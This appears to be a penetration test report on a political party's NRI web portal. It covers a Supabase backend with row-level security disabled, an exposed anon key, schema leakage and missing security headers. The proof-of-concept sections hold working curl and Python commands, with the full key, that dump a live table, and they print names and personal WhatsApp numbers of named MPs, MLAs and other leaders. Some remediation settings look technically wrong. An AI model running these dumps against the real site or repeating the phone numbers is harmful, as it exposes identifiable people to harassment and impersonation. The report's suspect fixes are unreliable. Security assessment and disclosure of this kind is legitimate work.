# VAPT Report: www.ysrcpnriwing.org
**Engagement Type:** Web Application Penetration Test  
**Target:** https://www.ysrcpnriwing.org  
**Test Date:** 2026-05-23  
**Tester:** Internal Security Team  
**Classification:** CONFIDENTIAL  

---

## Executive Summary

Security assessment of **www.ysrcpnriwing.org** (YSRCP NRI Wing Portal) identified **5 confirmed vulnerabilities** including one **Critical** data breach exposing personal contact information of **217 political party leaders** to any unauthenticated user on the internet.

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High     | 1 |
| Medium   | 2 |
| Low      | 1 |
| **Total** | **5** |

**Technology Stack:**
- Frontend: React (Vite SPA) hosted on Vercel CDN
- Backend: Supabase (PostgreSQL + PostgREST REST API)
- Supabase Project ID: `rcpcmjrahhzayqxexpkv`
- TLS: Let's Encrypt — TLSv1.3 (TLS_AES_128_GCM_SHA256)

---

## Findings Overview

| ID | Severity | Title | CVSS |
|----|----------|-------|------|
| V-01 | CRITICAL | Unauthenticated PII Exposure — 217 Leaders' WhatsApp Numbers | 9.8 |
| V-02 | HIGH | Supabase Anon JWT Key Hardcoded in Public JavaScript Bundle | 7.5 |
| V-03 | MEDIUM | Internal Database Schema Disclosed via API Error Hints | 5.3 |
| V-04 | MEDIUM | 22 Database Tables Readable Without Authentication | 5.3 |
| V-05 | LOW | Content Security Policy via Meta Tag + unsafe-inline | 3.1 |

---

## V-01: Unauthenticated PII Exposure — 217 Leaders' WhatsApp Numbers

**Severity:** CRITICAL | **CVSS:** 9.8  
**URL:** `https://rcpcmjrahhzayqxexpkv.supabase.co/rest/v1/leaders_master`  
**Authentication Required:** None  

### Description

The `leaders_master` table in the Supabase backend has **Row Level Security (RLS) disabled**. Any unauthenticated user can query the full table and retrieve the names and personal WhatsApp phone numbers of all 221 registered political leaders, including Members of Parliament (MPs) and Members of Legislative Assembly (MLAs).

**Data Exposed:**
- Full name of each leader
- Primary WhatsApp number
- Secondary WhatsApp number (where available)
- Active/inactive status
- Record creation timestamp
- Internal UUID

**Scale:**
- **221 total records** in table
- **217 real phone numbers** exposed
- **216 currently active** leaders
- Includes named MPs and MLAs

### Proof of Concept

**Step 1 — Extract the Supabase anon key from the public JS bundle:**
```bash
curl -s https://www.ysrcpnriwing.org/assets/index-ndUM4Tv2.js | \
  grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
```
**Output:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6
InJjcGNtanJhaGh6YXlxeGV4cGt2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYzODg4
NjAsImV4cCI6MjA5MTk2NDg2MH0.OP71JVHTtZc6Pm4zUUqfOZPsNmX46qAzYp904cIVc-Q
```

**Step 2 — Dump the entire leaders_master table (no login required):**
```bash
curl -s "https://rcpcmjrahhzayqxexpkv.supabase.co/rest/v1/leaders_master?select=*" \
  -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJjcGNtanJhaGh6YXlxeGV4cGt2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYzODg4NjAsImV4cCI6MjA5MTk2NDg2MH0.OP71JVHTtZc6Pm4zUUqfOZPsNmX46qAzYp904cIVc-Q" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJjcGNtanJhaGh6YXlxeGV4cGt2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYzODg4NjAsImV4cCI6MjA5MTk2NDg2MH0.OP71JVHTtZc6Pm4zUUqfOZPsNmX46qAzYp904cIVc-Q"
```

**Response (HTTP 200 — 221 records returned):**
```json
[
  {
    "id": "914010b0-43a8-4908-99a6-2eb659925e8b",
    "name": "DVR",
    "whatsapp_number": "+91 9849887728",
    "whatsapp_number_2": null,
    "is_active": true,
    "created_at": "2026-05-08T17:39:28.821454+00:00",
    "photo_url": null
  },
  {
    "id": "...",
    "name": "Akepati Amarnath Reddy",
    "whatsapp_number": "+919440269858",
    "whatsapp_number_2": null,
    "is_active": true,
    "created_at": "2026-04-20T16:17:18.696851+00:00",
    "photo_url": null
  },
  {
    "id": "...",
    "name": "Ambati Rambabu",
    "whatsapp_number": "+918978307999",
    "whatsapp_number_2": null,
    "is_active": true,
    "created_at": "...",
    "photo_url": null
  }
  ... 218 more records
]
```

**Step 3 — Python one-liner to dump all phone numbers:**
```python
import urllib.request, json, ssl
ctx = ssl.create_default_context()
KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJjcGNtanJhaGh6YXlxeGV4cGt2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYzODg4NjAsImV4cCI6MjA5MTk2NDg2MH0.OP71JVHTtZc6Pm4zUUqfOZPsNmX46qAzYp904cIVc-Q'
req = urllib.request.Request(
    'https://rcpcmjrahhzayqxexpkv.supabase.co/rest/v1/leaders_master?select=*',
    headers={'apikey': KEY, 'Authorization': f'Bearer {KEY}'}
)
with urllib.request.urlopen(req, context=ctx) as r:
    for row in json.loads(r.read()):
        print(f"{row['name']} | {row['whatsapp_number']}")
```

**Confirmed sample output:**
```
DVR | +91 9849887728
Akepati Amarnath Reddy | +919440269858
Alajangi Jogarao | +916281256433
Ambati Murali | +919603347011
Ambati Rambabu | +918978307999
Anam Vijay Kumar Reddy | +919966970000
Anantha Venkata Ramireddy | +919440055999
Botcha Satyanarayana | +917997511999
Buggana Rajendranath | +919440294104
Dr. Y.V. Subba Reddy, MP | +919849000916
Sri P.V. Midhun Reddy, MP | +919491045445
Dr. Peddireddy Ramachandra Reddy, MLA | +919010158888
... (217 total)
```

### Impact

- **Privacy breach** — Personal phone numbers of 217 leaders including MPs and MLAs exposed to entire internet
- **Phishing / Social Engineering** — Attackers can impersonate leaders using their real WhatsApp numbers
- **Harassment risk** — Phone numbers can be harvested for spam campaigns
- **Regulatory** — Violates India's IT Act 2000 Section 43A (reasonable security practices for personal data) and PDPB provisions

### Remediation

**Immediate fix (no code deployment needed — Supabase Dashboard only):**

1. Go to Supabase Dashboard → `rcpcmjrahhzayqxexpkv` project
2. Navigate to **Table Editor** → `leaders_master`
3. Click **RLS** → Enable Row Level Security
4. Delete any existing permissive policy (if any)
5. Add SELECT policy: `(auth.role() = 'authenticated')` — or `service_role` only
6. Verify: re-run the curl PoC → should return `[]` or HTTP 401

```sql
-- Run in Supabase SQL Editor
ALTER TABLE leaders_master ENABLE ROW LEVEL SECURITY;

-- Drop any existing open policy
DROP POLICY IF EXISTS "Enable read access for all users" ON leaders_master;

-- Allow only authenticated users (logged-in admins)
CREATE POLICY "Authenticated read only"
  ON leaders_master FOR SELECT
  USING (auth.role() = 'authenticated');
```

---

## V-02: Supabase Anon JWT Key Hardcoded in Public JavaScript Bundle

**Severity:** HIGH | **CVSS:** 7.5  
**File:** `https://www.ysrcpnriwing.org/assets/index-ndUM4Tv2.js`  
**File Size:** 1.8 MB (publicly downloadable)  

### Description

The Supabase anonymous API key (JWT) is hardcoded into the compiled JavaScript bundle served to every visitor. While Supabase's architecture expects the anon key to be public (it enables frontend-to-database communication), this is **only safe when Row Level Security is enforced on every table**. As demonstrated in V-01, RLS is not enforced, making this key the direct enabler of the data breach.

**JWT Decoded:**
```json
Header:  { "alg": "HS256", "typ": "JWT" }
Payload: {
  "iss": "supabase",
  "ref": "rcpcmjrahhzayqxexpkv",
  "role": "anon",
  "iat": 1776388860,   // Issued: 2026-04-17
  "exp": 2091964860    // Expires: 2036-04-16  (10-year validity)
}
```

**Key facts:**
- Key has **10-year validity** — cannot be silently revoked without breaking the app
- Key is embedded in the **compiled bundle** — changing it requires a new deployment
- Supabase Project ID `rcpcmjrahhzayqxexpkv` is also visible in the CSP header and image URLs

### Proof of Concept

**Step 1 — Download the bundle:**
```bash
curl -s https://www.ysrcpnriwing.org/assets/index-ndUM4Tv2.js -o bundle.js
wc -c bundle.js
# 1802968 bundle.js  (1.8 MB)
```

**Step 2 — Extract the JWT:**
```bash
grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bundle.js
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIs...
```

**Step 3 — Verify it works against the Supabase API:**
```bash
curl -s "https://rcpcmjrahhzayqxexpkv.supabase.co/rest/v1/news?limit=1" \
  -H "apikey: <extracted_key>" \
  -H "Authorization: Bearer <extracted_key>"
# Returns HTTP 200 with news data
```

### Remediation

1. **Primary fix:** Enforce RLS on all tables (V-01 remediation) — makes the anon key safe
2. Rotate the Supabase anon key after fixing RLS (Supabase Dashboard → Settings → API → Regenerate)
3. Set a shorter key expiry in future projects (Supabase default: use project settings)
4. Never store service-role keys in frontend code — only anon key is acceptable, but only with RLS

---

## V-03: Internal Database Schema Disclosed via API Error Hints

**Severity:** MEDIUM | **CVSS:** 5.3  
**URL:** `https://rcpcmjrahhzayqxexpkv.supabase.co/rest/v1/<tablename>`  

### Description

When querying a non-existent table name, the Supabase REST API (PostgREST) returns a `404` response with a `hint` field suggesting the correct table name from the database schema. This allows an attacker to enumerate the full internal database schema without any authentication.

### Proof of Concept

**Step 1 — Query a non-existent table:**
```bash
curl -s "https://rcpcmjrahhzayqxexpkv.supabase.co/rest/v1/members?limit=1" \
  -H "apikey: <anon_key>"
```

**Response (HTTP 404):**
```json
{
  "code": "PGRST205",
  "details": null,
  "hint": "Perhaps you meant the table 'public.homepage_banners'",
  "message": "Could not find the table 'public.members' in the schema cache"
}
```

**Step 2 — Iterative table discovery via hints:**

| Query Table | Hint Returned (Real Table Name) |
|-------------|--------------------------------|
| `members` | `public.homepage_banners` |
| `users` | `public.news` |
| `registrations` | `public.service_options` |
| `nri_registrations` | `public.nri_visits` |
| `donations` | `public.suggestions` |
| `event_registrations` | `public.event_applications` |
| `volunteers` | `public.volunteer_tasks` |
| `feedback` | `public.referrals` |
| `applications` | `public.job_applications` |
| `party_members` | `public.local_leaders` |
| `leaders` | `public.local_leaders` |
| `chapters` | `public.coordinators` |
| `auth_users` | `public.youtube_videos` |
| `admin_users` | `public.leaders_master` |
| `states` | `public.news_articles` |

**Full schema reconstructed without credentials:**
```
public.homepage_banners      public.news               public.service_options
public.nri_visits            public.suggestions        public.continents
public.volunteer_tasks       public.job_postings       public.profiles
public.events                public.countries          public.service_requests
public.grievances            public.event_applications public.referrals
public.job_applications      public.local_leaders      public.coordinators
public.leaders_master        public.youtube_videos     public.news_articles
public.service_categories
```

### Impact

An attacker gains a full map of the database schema, allowing targeted attacks against tables containing PII (e.g., `job_applications`, `grievances`, `event_applications`, `service_requests`).

### Remediation

Suppress PostgREST error hints in production by setting the environment variable:
```
PGRST_DB_CONFIG = true
```
Or configure PostgREST to not expose schema details:
```
# In supabase/config.toml
[api]
db_schema = "public"
db_extra_search_path = ""
```
Alternatively, implement a Supabase Edge Function as an API gateway that strips internal error details before returning to the client.

---

## V-04: 22 Database Tables Readable Without Authentication

**Severity:** MEDIUM | **CVSS:** 5.3  

### Description

22 database tables are accessible to anonymous (unauthenticated) users via the Supabase REST API. While several contain only reference data (countries, continents), others contain application data that should be access-controlled, and some sensitive tables (`job_applications`, `grievances`, `service_requests`, `event_applications`) are empty now but will accumulate user PII as the portal grows.

### Proof of Concept

**Single request to confirm unauthenticated access:**
```bash
ANON_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

for table in leaders_master events news service_options countries continents \
             service_categories nri_visits suggestions volunteer_tasks \
             job_postings event_applications referrals job_applications \
             local_leaders coordinators profiles service_requests grievances \
             youtube_videos news_articles homepage_banners; do
  count=$(curl -s "https://rcpcmjrahhzayqxexpkv.supabase.co/rest/v1/$table?select=*" \
    -H "apikey: $ANON_KEY" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d))")
  echo "$table -> $count rows"
done
```

**Output:**
```
leaders_master    -> 221 rows  *** PII EXPOSED ***
events            -> 4 rows
news              -> 2 rows
service_options   -> 19 rows
countries         -> 23 rows
continents        -> 7 rows
service_categories -> 9 rows
youtube_videos    -> 3 rows
homepage_banners  -> 0 rows    (empty — will grow)
nri_visits        -> 0 rows    (empty — will grow)
suggestions       -> 0 rows    (empty — will grow)
volunteer_tasks   -> 0 rows    (empty — will grow)
job_postings      -> 0 rows    (empty — will grow)
event_applications -> 0 rows   (empty — will grow)
referrals         -> 0 rows    (empty — will grow)
job_applications  -> 0 rows    (*** PII risk when populated ***)
local_leaders     -> 0 rows    (*** PII risk when populated ***)
coordinators      -> 0 rows    (*** PII risk when populated ***)
profiles          -> 0 rows    (*** PII risk when populated ***)
service_requests  -> 0 rows    (*** PII risk when populated ***)
grievances        -> 0 rows    (*** PII risk when populated ***)
news_articles     -> 0 rows    (empty)
```

**Table schema exposed via unauthenticated query:**
```bash
# leaders_master columns revealed without auth
curl -s ".../rest/v1/leaders_master?limit=0" -H "apikey: $ANON_KEY"
# Content-Range: */221  (total count exposed)
```

### Remediation

Enable RLS on every table with a clear policy matrix:

```sql
-- Enable RLS on ALL tables
ALTER TABLE events             ENABLE ROW LEVEL SECURITY;
ALTER TABLE news               ENABLE ROW LEVEL SECURITY;
ALTER TABLE service_options    ENABLE ROW LEVEL SECURITY;
ALTER TABLE job_applications   ENABLE ROW LEVEL SECURITY;
ALTER TABLE grievances         ENABLE ROW LEVEL SECURITY;
ALTER TABLE service_requests   ENABLE ROW LEVEL SECURITY;
ALTER TABLE event_applications ENABLE ROW LEVEL SECURITY;
ALTER TABLE profiles           ENABLE ROW LEVEL SECURITY;
ALTER TABLE local_leaders      ENABLE ROW LEVEL SECURITY;
ALTER TABLE coordinators       ENABLE ROW LEVEL SECURITY;
ALTER TABLE volunteer_tasks    ENABLE ROW LEVEL SECURITY;
ALTER TABLE referrals          ENABLE ROW LEVEL SECURITY;

-- Public content (intentionally readable by anyone)
CREATE POLICY "Public read" ON events          FOR SELECT USING (true);
CREATE POLICY "Public read" ON news            FOR SELECT USING (true);
CREATE POLICY "Public read" ON countries       FOR SELECT USING (true);
CREATE POLICY "Public read" ON continents      FOR SELECT USING (true);
CREATE POLICY "Public read" ON service_options FOR SELECT USING (true);

-- PII tables — authenticated only
CREATE POLICY "Auth only" ON leaders_master    FOR SELECT USING (auth.role() = 'authenticated');
CREATE POLICY "Auth only" ON job_applications  FOR SELECT USING (auth.role() = 'authenticated');
CREATE POLICY "Auth only" ON grievances        FOR SELECT USING (auth.role() = 'authenticated');
CREATE POLICY "Auth only" ON service_requests  FOR SELECT USING (auth.role() = 'authenticated');
CREATE POLICY "Auth only" ON profiles          FOR SELECT USING (auth.uid() = id);
```

---

## V-05: Content Security Policy via Meta Tag + unsafe-inline

**Severity:** LOW | **CVSS:** 3.1  

### Description

Two CSP weaknesses were identified:

1. **CSP delivered via HTML `<meta>` tag instead of HTTP response header.** Meta-based CSP does not protect against:
   - HTTP header injection attacks
   - Requests made before the HTML is parsed
   - Frame-based attacks (cannot block framing via meta CSP)

2. **`style-src 'unsafe-inline'` present** — allows inline styles to execute, weakening XSS protection if an attacker can inject HTML.

**From the page source:**
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://platform.twitter.com https://connect.facebook.net ...;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  ...
"/>
```

Also noted: **`access-control-allow-origin: *`** on the main page response — wildcard CORS allows any website to read the page response.

### Proof of Concept

```bash
# Confirm CSP is in meta, not header
curl -sI https://www.ysrcpnriwing.org/ | grep -i "content-security-policy"
# (no output — header absent)

curl -s https://www.ysrcpnriwing.org/ | grep -i "content-security-policy"
# <meta http-equiv="Content-Security-Policy" content="...unsafe-inline...">

# Confirm missing security headers
curl -sI https://www.ysrcpnriwing.org/ | grep -iE \
  "x-frame-options|x-content-type|referrer-policy|permissions-policy"
# (no output — all missing)
```

**Missing HTTP security headers:**
| Header | Status | Risk |
|--------|--------|------|
| `X-Frame-Options` | MISSING | Clickjacking |
| `X-Content-Type-Options` | MISSING | MIME sniffing |
| `Referrer-Policy` | MISSING | Data leakage in Referer |
| `Permissions-Policy` | MISSING | Browser feature abuse |
| `Content-Security-Policy` (header) | MISSING (in meta only) | Weakened XSS protection |

### Remediation

Add security headers in `vercel.json`:
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Frame-Options",           "value": "DENY" },
        { "key": "X-Content-Type-Options",    "value": "nosniff" },
        { "key": "Referrer-Policy",           "value": "strict-origin-when-cross-origin" },
        { "key": "Permissions-Policy",        "value": "camera=(), microphone=(), geolocation=()" },
        { "key": "Content-Security-Policy",   "value": "default-src 'self'; script-src 'self' https://platform.twitter.com https://connect.facebook.net; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob: https://rcpcmjrahhzayqxexpkv.supabase.co https://pbs.twimg.com; frame-src https://www.youtube.com https://www.facebook.com; connect-src 'self' https://rcpcmjrahhzayqxexpkv.supabase.co wss://rcpcmjrahhzayqxexpkv.supabase.co;" }
      ]
    }
  ]
}
```

Remove `'unsafe-inline'` from `style-src` and use CSS classes instead of inline styles.

---

## Prioritized Remediation Roadmap

| Priority | Action | Effort | Impact |
|----------|--------|--------|--------|
| **P0 — Now** | Enable RLS on `leaders_master` (Supabase Dashboard — no code change) | 5 min | Stops PII breach |
| **P0 — Now** | Enable RLS on all PII tables: `job_applications`, `grievances`, `service_requests`, `profiles`, `coordinators`, `local_leaders` | 15 min | Prevents future breach |
| **P1 — This Week** | Rotate Supabase anon key after RLS is confirmed working | 30 min | Key hygiene |
| **P1 — This Week** | Add security headers to `vercel.json` | 30 min | Stops clickjacking/MIME |
| **P2 — This Month** | Suppress PostgREST schema hints in production | 1 hour | Hides internal schema |
| **P2 — This Month** | Remove `'unsafe-inline'` from CSP style-src | 2–4 hours | Hardens XSS protection |

---

## Vulnerability Summary

| ID | Severity | Finding | Affected Asset | Status |
|----|----------|---------|---------------|--------|
| V-01 | **CRITICAL** | 217 leaders' WhatsApp numbers exposed — no RLS on `leaders_master` | Supabase DB | Open |
| V-02 | **HIGH** | Supabase anon JWT in public JS bundle (safe only with RLS — RLS is missing) | JS bundle | Open |
| V-03 | **MEDIUM** | Full database schema leaked via PostgREST error hints | Supabase API | Open |
| V-04 | **MEDIUM** | 22 tables readable without authentication | Supabase API | Open |
| V-05 | **LOW** | CSP via meta tag; `unsafe-inline`; missing security headers | Vercel/HTML | Open |

---

*Test Date: 2026-05-23 | Target: www.ysrcpnriwing.org | Tester: Internal Security Team*  
*All findings verified with live proof-of-concept. No data was modified or exfiltrated during testing.*
